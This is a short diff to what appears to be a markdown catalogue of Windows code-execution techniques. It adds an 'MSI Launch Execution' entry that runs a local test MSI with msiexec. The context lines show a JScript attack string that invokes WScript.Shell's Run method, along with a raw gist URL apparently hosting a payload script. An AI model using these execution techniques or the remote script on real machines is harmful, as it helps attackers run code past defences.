@@ -60,3 +60,12 @@ $attack = 'var invokeMethod = new ActiveXObject("WScript.Shell");invokeMethod.Ru
 https://gist.githubusercontent.com/homjxi0e/0d683007bd4a3ce39d3e19342aaa68ec/raw/4c8709382280de158b99dd78f91875e32a54bac4/ATPSJScript
 ```
 
+( 9 ) MSI Launch Execution ( MsiExec.exe ) 
+```
+ msiexec.exe C:\testing.msi 
+ &- File MSI Hello World Exe in .MSI 
+ 
+ 
+
+```
+
